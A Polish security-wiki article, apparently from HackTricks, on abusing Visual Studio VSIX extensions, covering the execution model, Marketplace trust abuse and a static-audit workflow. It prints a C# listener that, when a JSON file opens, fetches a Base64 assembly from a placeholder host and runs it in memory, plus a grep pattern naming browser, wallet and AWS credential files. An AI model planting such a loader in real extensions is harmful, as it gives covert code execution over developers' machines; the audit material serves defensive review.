# Nadużywanie rozszerzeń Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Rozszerzenie Visual Studio może zmienić rutynową pracę w edytorze w wykonanie kodu z uprawnieniami zalogowanego użytkownika. Złośliwy VSIX, wydawca podszywający się pod innego lub przejęta aktualizacja rozszerzenia mogą dotrzeć do użytkownika za pośrednictwem zwykłych kanałów instalacji. Instalacja wymagająca potwierdzenia administratora to ścieżka instalacji za zgodą użytkownika, a nie automatyczne podniesienie uprawnień.<sup>[[1]](#references)</sup>

## Model wykonywania

Rozszerzenia oparte na klasycznym VSSDK zwykle wykonują się wewnątrz `devenv.exe`. Nowszy model `VisualStudio.Extensibility` uruchamia nowoczesne rozszerzenia .NET głównie poza procesem: Visual Studio pośredniczy w wywołaniach do dedykowanego procesu `Microsoft.ServiceHub.Host.Extensibility`, co izoluje stabilność IDE, ale **nie** tworzy piaskownicy ograniczającej rozszerzeniu dostęp do uprawnień użytkownika w Windows. Dokładna nazwa pliku wykonywalnego może zawierać sufiks architektury, na przykład `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Wyzwalanie podczas zwykłej aktywności edytora

Zamiast udostępniać jedynie widoczne polecenie w menu, rozszerzenie może implementować `ITextViewOpenClosedListener`. Wywołanie zwrotne `TextViewOpenedAsync` jest uruchamiane dla pasujących dokumentów, a `TextViewExtensionConfiguration.AppliesTo` może ograniczyć aktywację do popularnego typu, takiego jak JSON. Prawdziwy formatter lub linter nadal może wykonywać reklamowane zadanie, podczas gdy druga akcja uruchamia się jako efekt uboczny otwarcia pliku.<sup>[[1]](#references)[[3]](#references)</sup>

Poniższy uproszczony wzorzec pokazuje najważniejsze punkty wykonania; dla jasności pominięto w nim właściwy formatter i obsługę błędów.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Ładowarka zarządzanego zestawu in-memory wyzwalana zdarzeniem</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Ten łańcuch pobiera tekst Base64, dekoduje go do bajtów assembly, ładuje z obiektu `MemoryStream` za pośrednictwem kolekcjonowalnego `AssemblyLoadContext`, wywołuje refleksyjnie `EntryPoint` bez parametrów lub z tablicą `string[]`, oczekuje na asynchroniczne punkty wejścia i zwalnia kontekst. Drugi etap nie jest zapisywany na dysku, chociaż VSIX i główna biblioteka DLL rozszerzenia pozostają artefaktami na dysku. Base64 nie zapewnia autentyczności ani poufności; użycie HTTP pozwala również atakującemu znajdującemu się na ścieżce podmienić odpowiedź.<sup>[[1]](#references)</sup>

Warianty operacyjne obejmują pomijanie wszystkich wyjątków, aby reklamowana funkcja działała dalej w przypadku niepowodzenia pobierania etapu, lub użycie `ITextViewChangedListener`, by uruchomić kod po edycji. Kod wykonuje się w hoście rozszerzeń i może korzystać z dostępnych dla tego użytkownika zarządzanych API, P/Invoke, plików, danych uwierzytelniających i procesów potomnych.<sup>[[1]](#references)</sup>

Powiązaną powierzchnię wykonywania kodu specyficzną dla edytora, opartą na automatycznym ładowaniu natywnych pluginów, opisano tutaj:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Nadużywanie zaufania do Marketplace i kanałów dystrybucji

VSIX może zostać dostarczony jako bezpośrednio udostępniony lub wykorzystany w phishingu plik, pobrany z Marketplace w sieci albo za pośrednictwem wbudowanej w Visual Studio przeglądarki Marketplace. Rejestracja wydawcy, która głównie wymusza unikalność i sprawdza listę zastrzeżonych słów, może umożliwić tworzenie nazw wydawców łudząco podobnych do zaufanych; przejęcie już zaufanego wydawcy lub rozszerzenia jest jeszcze skuteczniejsze, ponieważ daje dostęp do jego zainstalowanej bazy użytkowników. Instalacja z Marketplace uruchamia Visual Studio Installer i tymczasowo umieszcza pobrany plik VSIX w `%LOCALAPPDATA%\Temp`; `payload.vsix` jest również używany w uzasadnionych przypadkach, więc sama nazwa pliku nie jest wskaźnikiem.<sup>[[1]](#references)</sup>

MDSec nie zidentyfikowało protokołu URL Visual Studio, który bezpośrednio instalowałby rozszerzenie. Operator nadal musi nakłonić użytkownika do zainstalowania lub zaufania plikowi VSIX albo przejąć istniejący kanał dystrybucji rozszerzenia. Pakiet `AllUsers` instaluje się w folderze instalacyjnym Visual Studio i może wymagać podniesienia uprawnień, ale jest to standardowe działanie instalatora wymagające zgody, a nie automatyczna droga do uzyskania uprawnień administratora lub SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Audyt statyczny na dużą skalę

Pakiety VSIX są zwykle archiwami ZIP, więc bezpieczny pipeline do przeglądu Marketplace może wyliczać pakiety, rozpakowywać je **bez ładowania kodu rozszerzenia**, analizować manifesty, identyfikować powierzchnie wykonywania kodu i dekompilować zarządzane assembly za pomocą `ilspycmd`. Nadaj priorytet assembly należącym do rozszerzeń po wykluczeniu typowych dołączonych zależności, a następnie koreluj ciągi znaków związane z magazynami danych uwierzytelniających z klastrami zachowań, takimi jak odczyt plików i wysyłanie przez sieć, kodowanie i wysyłanie, pobieranie i wykonywanie, dostęp do menedżera poświadczeń i sieci albo zrzut ekranu i wysyłanie.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Zinwentaryzuj także natywne biblioteki DLL, cele MSBuild, skrypty, szablony T4 i payloady instalatorów, zamiast zakładać, że każda powierzchnia wykonywania kodu obejmuje kod zarządzany. Porównaj podejrzane zachowanie z deklarowanym przeznaczeniem w manifeście; telemetria i legalne programy aktualizujące mogą przypominać eksfiltrację lub staging. Analiza wyłącznie statyczna nie wykrywa kodu spakowanego, zaciemnionego, dynamicznie rozwiązywanego ani uśpionego, a przeglądanie tylko najnowszej wersji pomija złośliwe wcześniejsze wydania.<sup>[[1]](#references)</sup>

VS Code używa innego hosta rozszerzeń i manifestu. Informacje o zapisywalnym udziale, z którego automatyczna instalacja rozszerzeń VS Code uruchamia kod, znajdziesz w artykule [VS Code extension drop-share execution](vscode-extension-abuse.md).

Osobny atak podczas ładowania projektu może uruchomić złośliwy cel [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) bez instalowania VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Ponowne omówienie rozszerzeń Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Informacje o VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Budowa pakietu VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - narzędzie .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Kampania Blinder Tunnel wymierzona w infrastrukturę Iraku](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
